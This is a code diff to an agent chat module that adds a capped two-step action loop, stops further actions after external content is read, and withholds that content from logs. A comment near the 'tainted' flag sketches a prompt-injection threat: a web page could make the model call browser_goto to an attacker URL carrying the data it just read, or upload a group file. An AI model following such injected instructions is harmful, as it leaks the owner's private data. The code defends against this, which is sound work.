@@ -21,6 +21,7 @@ Every synchronous AgentBrain call is pushed off the event loop with
 asyncio.to_thread (the pattern at telegram_listener.py:671/695/740).
 """
 import asyncio
+import json
 import logging
 import os
 import re
@@ -30,6 +31,13 @@ logger = logging.getLogger("Chat")
 
 SKILL_TIMEOUT_SEC = 600
 SKILL_LIMIT = 3
+# Model calls one user turn may make. 1 = the old behaviour (act, then stop
+# with the job half done). 2 = act, read the result, finish. Deliberately not
+# "until the model says it is done": this slice buys the second half of one
+# sentence, not an agent loop.
+STEP_CAP = 2
+# How much of the user's original request is quoted back in the follow-up.
+FOLLOWUP_QUOTE = 400
 
 # ── Hạn mức cho MỘT lượt của người dùng ──────────────────────────────
 # Luật nằm ở core/turn_budget.py, KHÔNG ở đây. run_turn (hàm duy nhất mở ngân
@@ -78,6 +86,41 @@ def wrap_external(text: str, source: str = "") -> str:
     return f"{head}\n{_defang(text)}\n{EXTERNAL_DATA_CLOSE}"
 
 
+def is_external(text) -> bool:
+    """Đoạn text này có mang nội dung từ nguồn ngoài không?"""
+    return EXTERNAL_DATA_OPEN in str(text or "")
+
+
+def _loggable(text) -> str:
+    """Cái được phép GHI LẠI của một kết quả có nội dung ngoài: xuất xứ, không phải ruột.
+
+    browser_read đọc bằng phiên ĐÃ ĐĂNG NHẬP của chủ máy. Nếu chuỗi trả về đi
+    thẳng vào nhật ký nhóm (data/ trên đĩa) và vào sheet nhật ký công việc
+    (record_worklog đẩy sang Google), thì đúng thứ mà động từ này tồn tại để
+    đọc — hộp thư riêng, trang nội bộ, bài trả tiền — bị chép ra đĩa và đẩy ra
+    khỏi máy ở MỌI lần đọc. Dòng đầu (do handler viết: đọc từ hồ sơ nào) cộng
+    kích thước là đủ để người xem canvas biết đã có một lần đọc, từ đâu, to
+    chừng nào — mà không lưu lại trang.
+    """
+    s = str(text or "")
+    if not is_external(s):
+        return s
+    cut = s.index(EXTERNAL_DATA_OPEN)
+    head = s[:cut].strip()[:160]            # câu của handler: đọc từ hồ sơ nào
+    rest = s[cut:]
+    first = rest.split("\n", 1)[0]
+    source = ""
+    if "source=" in first:
+        source = first.split("source=", 1)[1].rsplit(">>>", 1)[0].strip()[:160]
+    end = rest.find(EXTERNAL_DATA_CLOSE)
+    tail = rest[end + len(EXTERNAL_DATA_CLOSE):].strip()[:200] if end >= 0 else ""
+    note = (f"[external content from {source}: {len(rest)} chars, withheld]"
+            if source else f"[external content: {len(rest)} chars, withheld]")
+    # Không để lại delimiter trong nhật ký: dòng nhật ký còn được đọc lại và in
+    # ra chỗ khác, mà một dấu mở lạc lõng ở chỗ khác là một cái bọc dở dang.
+    return " ".join(p for p in (head, note, tail) if p)
+
+
 async def run_turn(
     message: str,
     agent_dict: Dict[str, Any],
@@ -112,7 +155,7 @@ async def run_turn(
         return await _run_turn(
             message, agent_dict, history, auto_route=auto_route,
             model_override=model_override, provider_override=provider_override,
-            session_id=session_id, group_id=group_id,
+            session_id=session_id, group_id=group_id, budget=budget,
         )
 
 
@@ -125,6 +168,7 @@ async def _run_turn(
     provider_override: str = "",
     session_id: str = "",
     group_id: str = "",
+    budget: Optional[Dict[str, Any]] = None,
 ) -> Tuple[str, Dict[str, Any]]:
     """Process one user turn. Returns (reply_text, meta).
 
@@ -135,6 +179,11 @@ async def _run_turn(
 
     `group_id` is the Flow Builder group of the node that sent the message;
     "" means the union of the agent's groups (see core.group_context).
+
+    `budget` is the open turn budget (core/turn_budget.py). It is read, never
+    spent, and only to answer one question: is there room for a second step?
+    None means "no budget open" (a direct caller, a test) and nothing is capped
+    but the STEP_CAP below.
     """
     from tubecli.core.brain import AgentBrain
 
@@ -166,13 +215,48 @@ async def _run_turn(
     allowed = agent_dict.get("allowed_skills") or []
     available = [s for s in all_skills if s.get("id") in allowed] if allowed else all_skills
 
+    # ── Tier 0: what is on the desk ──────────────────────────────
+    # Read FIRST, before anything is classified, because the answer decides
+    # whether the keyword router is allowed to decide at all. A node inside a
+    # group is usable by every agent in that group and by nobody else; the
+    # canvas names the group of the node that sent the message, and with none
+    # named it is the union of the agent's groups.
+    groups = _group_workspace(home_agent_id, group_id)
+    group_ids = [g.get("group_id", "") for g in groups if g.get("group_id")]
+    desk_actionable = _desk_is_actionable(groups)
+    meta["desk"] = ("actionable" if desk_actionable else "passive") if groups else ""
+
     # ── Tier 1: zero-token classification ────────────────────────
     intent = None
     try:
+        from tubecli.core import intent_router as intent_router_mod
         from tubecli.core.intent_router import intent_router
 
         intent = intent_router.classify(message, agent_dict, available)
         meta["intent"] = intent.intent_type
+
+        # THE DESK OVERRULES THE KEYWORD ROUTER.
+        # classify() is 165 hard-coded Vietnamese words: on eight of the nine
+        # shipped locales it is simply wrong, and even in Vietnamese it is a
+        # guess ("tin tức" → SEARCH, "tin mới nhất" → somewhere else). Guessing
+        # is survivable while the agent owns nothing but generic skills. It is
+        # not survivable once someone has put real tools on its desk: the guess
+        # runs Google Search on a turn whose answer was one browser verb away.
+        # So when the group exposes an actionable kind, every GUESSED branch is
+        # handed back to the model — the one component in this system that is
+        # actually multilingual. The literal skill-command match survives,
+        # because the user typed the owner's own command verbatim.
+        # No keyword is added here, in any language: the condition is purely
+        # structural (core.group_context.actionable_kinds).
+        if intent is not None and desk_actionable:
+            deferred = intent_router_mod.defer_to_model(intent)
+            if deferred is not intent:
+                logger.info(
+                    f"[Chat] desk holds tools → intent '{intent.intent_type}' "
+                    f"deferred to the model")
+                meta["intent_deferred"] = deferred.deferred_from
+                meta["intent"] = deferred.intent_type
+                intent = deferred
     except Exception as e:
         logger.warning(f"[Chat] Intent classification failed: {e}")
 
@@ -337,33 +421,152 @@ async def _run_turn(
         )
 
     # ── …and what the Flow Builder group shares with this agent ──
-    # A node inside a group is usable by every agent in that group and by
-    # nobody else. The canvas names the group of the node that sent the
-    # message; with none named it is the union of the agent's groups. The
-    # block lists only what exists, so an agent outside any group sees nothing.
-    groups = _group_workspace(home_agent_id, group_id)
-    group_block = _group_prompt(groups) if groups else ""
+    # Read at the top of the turn (Tier 0). The block lists only what exists,
+    # so an agent outside any group sees nothing at all. The message travels
+    # with it for ONE reason: a URL in it is pasted into the action examples so
+    # a small model can copy a complete call. No words are read.
+    group_block = _group_prompt(groups, message) if groups else ""
     if group_block:
         agent_for_call["system_prompt"] = (
             agent_for_call.get("system_prompt", "") + "\n\n" + group_block
         )
-    group_ids = [g.get("group_id", "") for g in groups if g.get("group_id")]
 
     # Applied LAST, after any specialist swap: routing replaces the whole agent
     # dict, so an instruction added earlier would be thrown away — which is
     # exactly why a Japanese question kept coming back in Vietnamese.
+    # It lands AFTER the desk block on purpose: AgentBrain.build_system_prompt
+    # lifts everything from the "### GROUP WORKSPACE:" marker to the end of the
+    # persona and re-attaches it at the very end of the system prompt, so both
+    # the desk and this rule end up in the position a small model recalls best.
     agent_for_call = _with_language_instruction(agent_for_call)
 
-    # ── Tier 2: one LLM call ─────────────────────────────────────
-    result = await asyncio.to_thread(
-        AgentBrain.chat_targeted, message, agent_for_call, skills, history, ""
-    )
-    result = result or {}
-    reply = result.get("reply", "") or ""
-    action = result.get("action")
-    meta["action"] = action or ""
+    # ── Tier 2: the model, then the work, then the model again ───
+    # A turn used to end the moment ONE action had run. "Open vnexpress in the
+    # browser and summarise the news" therefore opened the page and stopped:
+    # the thing to summarise only came into existence AFTER the action. So the
+    # result of an action goes BACK to the model, which either finishes the job
+    # in words or asks for the one next action.
+    #
+    # STEP_CAP counts ACTIONS, not model calls. Two actions are allowed, and
+    # after the last one the model is always called once more — that final call
+    # may not act, only answer. A turn is therefore at most: act, act, answer.
+    #
+    # It terminates, five ways:
+    #   * STEP_CAP actions have run — the next call can only write the answer;
+    #   * the turn budget (core/turn_budget.py, 12 actions) — no further action
+    #     without room left in it;
+    #   * an error result ends the turn: retrying a failure is how loops start;
+    #   * a queued codex task: there is nothing to continue FROM yet;
+    #   * a fingerprint of (action + its arguments) — the same call proposed
+    #     twice stops the turn BEFORE it runs a second time.
+    turn_message = message
+    turn_history = list(history or [])
+    seen_actions: set = set()
+    steps = 0                 # actions that really ran
+    calls = 0                 # model calls, always steps + 1 at most
+    reply = ""
+    last_text = ""
+    # Nội dung ngoài đã vào lượt này chưa? Xem chú thích ở chỗ gán True bên dưới.
+    tainted = False
+    while True:
+        calls += 1
+        meta["model_calls"] = calls
+        result = await asyncio.to_thread(
+            AgentBrain.chat_targeted, turn_message, agent_for_call, skills,
+            turn_history, "", len(available),
+        )
+        result = result or {}
+        reply = result.get("reply", "") or ""
+        action = result.get("action")
+        meta["action"] = action or ""
 
-    # ── Act on what the model decided ────────────────────────────
+        # ── Act on what the model decided ────────────────────────
+        if action == "run_skill":
+            break
+        if steps >= STEP_CAP or tainted:
+            # The action budget for this turn is spent — or external content
+            # has already entered the turn, which spends it for the same
+            # reason: this call was the answer-only one, so nothing here is
+            # dispatched.
+            meta["stopped_after_step"] = (
+                "external_data" if tainted and steps < STEP_CAP else "step_cap")
+            if action:
+                # It asked for one more anyway. Hand back the data the last
+                # action produced rather than a JSON blob the user cannot use.
+                logger.info(f"[Chat] no action left ({meta['stopped_after_step']}), "
+                            f"'{action}' not run")
+                answer = last_text or _clean(reply)
+                _log_group_activity(groups, agent_for_call, message, answer)
+                return answer, meta
+            break
+        fingerprint = _action_fingerprint(result)
+        if action and fingerprint and fingerprint in seen_actions:
+            # The model asked for the call it has just made. Stop here, and
+            # hand back the data that call already produced rather than the
+            # raw JSON of a repeat.
+            logger.info(f"[Chat] step {steps}/{STEP_CAP}: same action proposed twice, stopping")
+            meta["stopped_after_step"] = "repeat"
+            answer = last_text or _clean(reply)
+            _log_group_activity(groups, agent_for_call, message, answer)
+            return answer, meta
+        if fingerprint:
+            seen_actions.add(fingerprint)
+
+        # Any verb (codex_create_task, add_tracker, browser_goto, run_api, …)
+        # goes to the shared dispatcher — the piece the stock web chat lacks.
+        dispatched = await _dispatch_extension_action(reply, agent_for_call, group_ids, group_id)
+        if dispatched is None or dispatched == reply:
+            break                       # nothing ran; this reply IS the answer
+
+        text, task = _extract_task_marker(dispatched)
+        if task:
+            # The chat turns this into a live card: approve/reject buttons, a
+            # progress bar while it runs, and the result when it finishes.
+            meta["codex_task"] = task
+        last_text = text
+        if EXTERNAL_DATA_OPEN in str(text or ""):
+            # Nội dung NGOÀI vừa vào lượt này (chữ của một trang web đọc bằng
+            # phiên đã đăng nhập của chủ máy, nội dung một file…). Từ đây trở
+            # đi model vẫn được gọi MỘT lần nữa để viết câu trả lời — nhưng
+            # KHÔNG được cấp thêm một hành động nào.
+            #
+            # Lý do: EXTERNAL_DATA_NOTE và cái bọc chỉ là lời DẶN. Không có gì
+            # về mặt cấu trúc ngăn model làm đúng cái trang kia bảo — mà một
+            # hành động thứ hai sau khi đọc là hành động do TRANG chọn, chạy
+            # bằng quyền của chủ: browser_goto("https://kẻ-xấu/?d=<vừa đọc>")
+            # là một đường tuồn dữ liệu ra ngoài qua chính trình duyệt của chủ,
+            # browser_upload là một file của nhóm đẩy lên ô upload trang đó bày
+            # ra. Thứ tự an toàn (goto rồi read) không mất gì: read nằm ở bước
+            # 2 nên vốn đã không có hành động nào sau nó.
+            tainted = True
+        steps += 1
+        meta["steps"] = steps
+        acted = str(action or "action")
+        meta.setdefault("step_actions", []).append(acted)
+        # The dispatcher changed the text, so an action really ran.
+        _log_worklog(groups, agent_for_call, message, text, artifacts)
+        _log_step(groups, agent_for_call, steps, acted, text)
+
+        # A queued codex task has not produced anything to continue FROM: the
+        # user still has to approve it and it finishes later, on its own card.
+        stop = "queued" if task else _stop_reason(text, budget)
+        if stop:
+            logger.info(f"[Chat] step {steps}/{STEP_CAP} is the last one: {stop}")
+            meta["stopped_after_step"] = stop
+            _log_group_activity(groups, agent_for_call, message, text)
+            return text, meta
+
+        # Feed the result back in and let the model finish the second half.
+        turn_history = turn_history + [
+            {"role": "user", "content": turn_message},
+            {"role": "assistant", "content": reply},
+        ]
+        turn_message = _followup_prompt(message, acted, dispatched, steps,
+                                        left=0 if tainted else STEP_CAP - steps)
+
+    # Out of the loop. A skill run ends the turn in this slice: it is its own
+    # sub-pipeline (autonomous_run, its own dispatch, its own timeout) and
+    # giving it a second step too is a separate piece of work.
     if action == "run_skill":
         skill = _get_skill(result.get("skill_id") or "")
         if skill:
@@ -413,20 +616,6 @@ async def _run_turn(
                 return failed, meta
         _log_group_activity(groups, agent_for_call, message, reply)
         return reply, meta
-
-    # Any other verb (codex_create_task, add_tracker, run_api, …) goes to the
-    # shared dispatcher — this is the piece the stock web chat is missing.
-    dispatched = await _dispatch_extension_action(reply, agent_for_call, group_ids, group_id)
-    if dispatched is not None and dispatched != reply:
-        text, task = _extract_task_marker(dispatched)
-        if task:
-            # The chat turns this into a live card: approve/reject buttons, a
-            # progress bar while it runs, and the result when it finishes.
-            meta["codex_task"] = task
-        # The dispatcher changed the text, so an action really ran.
-        _log_worklog(groups, agent_for_call, message, text, artifacts)
-        _log_group_activity(groups, agent_for_call, message, text)
-        return text, meta
 
     text, task = _extract_task_marker(_clean(reply))
     if task:
@@ -856,14 +1045,153 @@ def _group_workspace(agent_id: str, group_id: str = "") -> List[Dict[str, Any]]:
         return []
 
 
-def _group_prompt(groups: List[Dict[str, Any]]) -> str:
+def _group_prompt(groups: List[Dict[str, Any]], message: str = "") -> str:
     try:
         from tubecli.core import group_context
 
-        return group_context.prompt_block(groups) or ""
+        try:
+            return group_context.prompt_block(groups, message) or ""
+        except TypeError:
+            # A hot-patched core older than the filled-in examples.
+            return group_context.prompt_block(groups) or ""
     except Exception as e:
         logger.warning(f"[Chat] group prompt skipped: {e}")
         return ""
+
+
+def _desk_is_actionable(groups: List[Dict[str, Any]]) -> bool:
+    """Does this desk hold a TOOL, as opposed to only material to read?
+
+    The whole point of this question is that it can be answered without
+    looking at a single word of the user's message: it is the shape of the
+    group that decides (core.group_context.actionable_kinds — a kind counts
+    when it hands the model action syntax for the entries this group holds).
+    A group with nothing but a playbook is material, not tools, and answers
+    False.
+
+    Fails CLOSED (False) on any error: an unanswerable question must leave the
+    old routing exactly as it was.
+    """
+    if not groups:
+        return False
+    try:
+        from tubecli.core import group_context
+
+        return bool(group_context.has_actionable(groups))
+    except Exception as e:
+        logger.warning(f"[Chat] desk shape unknown, keyword routing kept: {e}")
+        return False
+
+
+# ── The two-step turn ────────────────────────────────────────────────
+
+def _action_fingerprint(result: Dict[str, Any]) -> str:
+    """Identity of the call the model just proposed: verb + arguments.
+
+    Two steps proposing the same fingerprint means the model is going in a
+    circle, and the turn stops BEFORE the call runs a second time. Falls back
+    to the raw reply when the action carried no parsed data, which is still a
+    faithful "you said exactly this again".
+    """
+    data = result.get("action_data") if isinstance(result, dict) else None
+    if isinstance(data, dict):
+        try:
+            return json.dumps(data, sort_keys=True, ensure_ascii=False, default=str)[:2000]
+        except Exception:
+            pass
+    return re.sub(r"\s+", " ", str((result or {}).get("reply", "") or "")).strip()[:2000]
+
+
+def _budget_room(budget: Optional[Dict[str, Any]]) -> bool:
+    """Is there still room in this turn's action budget for another step?
+
+    Read-only: the spending happens in core/telegram_actions._run_action, the
+    one dispatcher every action goes through. No open budget (a direct caller,
+    a test) means nothing to check — STEP_CAP still bounds the loop.
+    """
+    if not isinstance(budget, dict):
+        return True
+    return int(budget.get("actions", 0) or 0) < MAX_ACTIONS_PER_TURN
+
+
+def _stop_reason(text: str, budget: Optional[Dict[str, Any]]) -> str:
+    """"" = this result is worth taking back to the model. Anything else names
+    the reason the turn ends on the action that just ran.
+
+    The STEP_CAP itself is NOT checked here — reaching it does not end the
+    turn, it only forbids a further action while the model still gets its
+    closing call to write the answer.
+    """
+    if _worklog_status(text) == "error":
+        # Feeding a failure back only invites the model to try it again.
+        return "error"
+    if not str(text or "").strip():
+        return "empty"
+    if not _budget_room(budget):
+        return "budget"
+    return ""
+
+
+def _followup_prompt(original_message: str, action_type: str, output: str, step: int,
+                     left: int = 0) -> str:
+    """The next turn: the result of the action just run, and what to do with it.
+
+    `left` is how many further actions this turn may still run. At 0 the model
+    is told plainly that it must answer now — a model that thinks it has one
+    more move will spend the closing call on an action nobody will dispatch.
+
+    English, like the rest of the system prompt — which language the ANSWER
+    comes back in is decided by _with_language_instruction, not by this.
+    """
+    body = output if EXTERNAL_DATA_OPEN in str(output or "") else wrap_external(
+        output, f"result of {action_type}")
+    asked = " ".join(str(original_message or "").split())[:FOLLOWUP_QUOTE]
+    if left > 0:
+        closing = (
+            "If this already answers me, write the answer now, in plain text, and emit NO "
+            f"action. If one more action is genuinely needed to finish the job (you have "
+            f"{left} left this turn), emit that single action in a ```json fence. Never "
+            "repeat the action you just ran, and never ask me to run it myself."
+        )
+    else:
+        closing = (
+            "This turn has no actions left, so write the answer NOW, in plain text, using "
+            "what is above. Emit NO action — nothing else will run. If the material above "
+            "is not enough, say exactly what is missing."
+        )
+    return (
+        f"{body}\n\n"
+        f"That is the result of the `{action_type}` you just ran — action {step} of "
+        f"{STEP_CAP} for what I asked you: \"{asked}\".\n" + closing
+    )
+
+
+def _log_step(groups: List[Dict[str, Any]], agent_dict: Dict[str, Any], step: int,
+              action_type: str, text: str) -> None:
+    """One row per step of a multi-step turn, on the canvas log panel.
+
+    The dispatcher writes its own row for the action itself; this row is what
+    makes the SEQUENCE readable — "browser_goto (1/2)" then "browser_read
+    (2/2)" — so a watcher can tell a finished two-step turn from one that
+    stalled after the first action.
+    """
+    if not groups:
+        return
+    try:
+        from tubecli.core import group_log
+
+        agent = agent_dict if isinstance(agent_dict, dict) else {}
+        ok = _worklog_status(text) != "error"
+        for g in groups:
+            gid = (g or {}).get("group_id") if isinstance(g, dict) else ""
+            if not gid:
+                continue
+            group_log.append(gid, agent.get("id", ""), agent.get("name", ""),
+                             kind="step", title=f"{action_type} ({step}/{STEP_CAP})",
+                             detail=_loggable(text), ok=ok,
+                             extra={"step": f"{step}/{STEP_CAP}"})
+    except Exception as e:
+        logger.warning(f"[Chat] step log skipped: {e}")
 
 
 def _worklog_status(text: str) -> str:
@@ -883,12 +1211,15 @@ def _log_worklog(groups: List[Dict[str, Any]], agent_dict: Dict[str, Any], task:
         from tubecli.core import group_context
 
         found: List[str] = []
-        _paths_in(result_text, found)          # what this action just produced
+        if not is_external(result_text):
+            # Nội dung ngoài KHÔNG được quét lấy đường dẫn: cột "sản phẩm" của
+            # sheet nhật ký khi ấy do trang web viết, chứ không phải do agent.
+            _paths_in(result_text, found)      # what this action just produced
         for p in artifacts or []:
             if p not in found:
                 found.append(p)
         group_context.record_worklog(
-            groups, agent_dict, task=task, result=result_text, artifacts=found,
+            groups, agent_dict, task=task, result=_loggable(result_text), artifacts=found,
             status=status or _worklog_status(result_text),
         )
     except Exception as e:
@@ -920,7 +1251,7 @@ def _log_group_activity(groups: List[Dict[str, Any]], agent_dict: Dict[str, Any]
                 continue
             group_log.append(gid, agent.get("id", ""), agent.get("name", ""),
                              kind="chat", title=str(message or "")[:120],
-                             detail=str(reply_text or ""), ok=answered_ok)
+                             detail=_loggable(reply_text), ok=answered_ok)
     except Exception as e:
         logger.warning(f"[Chat] group log skipped: {e}")
 
